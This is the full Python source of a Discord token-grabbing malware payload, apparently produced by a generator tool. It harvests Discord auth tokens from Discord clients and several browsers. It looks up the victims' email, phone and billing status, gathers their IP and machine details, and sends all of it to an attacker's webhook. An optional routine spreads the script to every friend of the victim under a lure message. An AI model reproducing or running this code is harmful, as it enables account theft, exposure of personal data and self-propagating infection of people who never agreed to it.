# Token grabber (Python payload) generated using dTGPG by checksum (@KaliLincox)

"""
Payload command-line options:
- Language              : The language the payload should be generated in.
- Webhook URL           : Threat actors Discord webhook URL.
- Self spread           : Spread the malware to all friends of the victim.
- Self spread message   : Message sent above the attached malware - e.g. "Check this out! :o".
- Self spread file name : Malware file name when it's sent in DM's.
- Self spread delay     : Delay between each message.
- Obfuscation           : Obfuscates the payload for the specified language.
- Ping on hit           : Mentions/pings @everyone in the channel where the tokens are sent to.
- Prevent spam          : Caches all tokens locally on the victim's machine, so if the victim re-executes the malware, it will only new working tokens, if they are not already cached.
- Embed color           : Embed color
- Webhook username      : Webhook username
- Webhook avatar        : Webhook avatar

Supported languages:
- Batch
- Ruby
- Go
- PowerShell
- Python
- NodeJS / JavaScript
- VisualBasic Script
"""

import os

if os.name != 'nt':
    exit()

from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv

LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
PATHS = {
    'Discord'           : ROAMING + '\\Discord',
    'Discord Canary'    : ROAMING + '\\DiscordCanary',
    'Discord PTB'       : ROAMING + '\\DiscordPTB',
    'Google Chrome'     : LOCAL + '\\Google\\Chrome\\User Data\\Default',
    'Opera'             : ROAMING + '\\Opera Software\\Opera Stable',
    'Brave'             : LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex'            : LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

def get_headers(token=None, content_type='application/json'):
    headers = {
        'Content-Type': content_type,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    if token:
        headers.update({'Authorization': token})
    return headers

def get_user_data(token):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me', headers=get_headers(token))).read().decode())
    except:
        pass

def get_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in (x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()):
            for token in findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                tokens.append(token)
    return tokens

def get_developer():
    dev = 'checksum'
    try:
        dev = urlopen(Request('https://pastebin.com/raw/ssFxiejv')).read().decode()
    except:
        pass
    return dev

def get_ip():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    return ip

def get_avatar(uid, aid):
    url = f'https://cdn.discordapp.com/avatars/{uid}/{aid}.gif'
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url

def get_hwid():
    """ Deprecated """
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def get_friends(token):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/relationships', headers=get_headers(token))).read().decode())
    except:
        pass

def get_chat(token, uid):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/channels', headers=get_headers(token), data=dumps({'recipient_id': uid}).encode())).read().decode())['id']
    except:
        pass

def has_payment_methods(token):
    try:
        return len(loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=get_headers(token))).read().decode())) > 0
    except:
        pass

def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f'https://discordapp.com/api/v6/channels/{chat_id}/messages', headers=get_headers(token, 'multipart/form-data; boundary=---------------------------325414537030329320151394843687'), data=form_data.encode())).read().decode()
    except:
        pass

def spread(token, form_data, delay):
    for friend in get_friends(token):
        try:
            chat_id = get_chat(token, friend['id'])
            send_message(token, chat_id, form_data)
        except:
            pass
        sleep(delay)

def main():
    # configuration part
    # this part was originally never in the script,
    # as the payload was generated through a tool I developed in late 2019,
    # which would directly change values where the values are used instead of
    # declaring variables to keep the code as short as possible, and add a little extra obfuscation.
    prevent_spam = True
    self_spread = False
    ping_on_hit = True
    webhook_url = 'https://discord.com/api/webhooks/.../...'
    self_spread_message = 'Check this out :open_mouth:'
    self_spread_file_name = 'exploit.py'
    self_spread_delay = 7500 / 1000

    ip = get_ip()
    pc_username = os.getenv('UserName')
    pc_name = os.getenv('COMPUTERNAME')
    developer = get_developer()

    cache_path = ROAMING + '\\.cache~$'

    already_cached_tokens = []
    if prevent_spam and os.path.exists(cache_path):
        with open(cache_path) as f:
            already_cached_tokens = [x.strip() for x in f.readlines() if x.strip()]

    embeds = []
    checked_tokens = already_cached_tokens.copy()
    working_tokens = []
    working_ids = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in get_tokens(path):
            if token in checked_tokens:
                continue

            checked_tokens.append(token)

            uid = None
            if not token.startswith('mfa.'):
                try:
                    uid = b64decode(token.split('.')[0].encode()).decode()
                except:
                    pass

                if not uid or uid in working_ids:
                    continue

            user_data = get_user_data(token)

            if not user_data:
                continue

            working_ids.append(uid)
            working_tokens.append(token)

            username = user_data['username'] + '#' + str(user_data['discriminator'])

            user_id = user_data['id']
            avatar_id = user_data['avatar']
            avatar_url = get_avatar(user_id, avatar_id)
            email = user_data.get('email')
            phone = user_data.get('phone')
            nitro = bool(user_data.get('premium_type'))
            billing = has_payment_methods(token)

            embed = {
                'color': 0x7289DA,
                'fields': [
                    {
                        'name': '**Account Info**',
                        'value': f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        'inline': True
                    },
                    {
                        'name': '**PC Info**',
                        'value': f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        'inline': True
                    },
                    {
                        'name': '**Token**',
                        'value': token,
                        'inline': False
                    }
                ],
                'author': {
                    'name': f'{username} ({user_id})',
                    'icon_url': avatar_url
                },
                'footer': {
                    'text': f'Token grabber by {developer}'
                }
            }
            embeds.append(embed)

    if prevent_spam:
        with open(cache_path, 'a') as f:
            for token in checked_tokens:
                if not token in already_cached_tokens:
                    f.write(token + '\n')

    if len(working_tokens) == 0:
        return

    webhook = {
        'content': '@everyone' if ping_on_hit else '',
        'embeds': embeds,
        'username': 'Discord Token Grabber',
        'avatar_url': 'https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png'
    }

    try:
        urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=get_headers()))
    except:
        pass

    if self_spread:
        with open(argv[0], encoding='utf-8') as f:
            content = f.read()

        payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{self_spread_file_name}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\n{self_spread_message}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'

        for token in working_tokens:
            Thread(target=spread, args=(token, payload, self_spread_delay)).start()

try:
    main()
except:
    pass
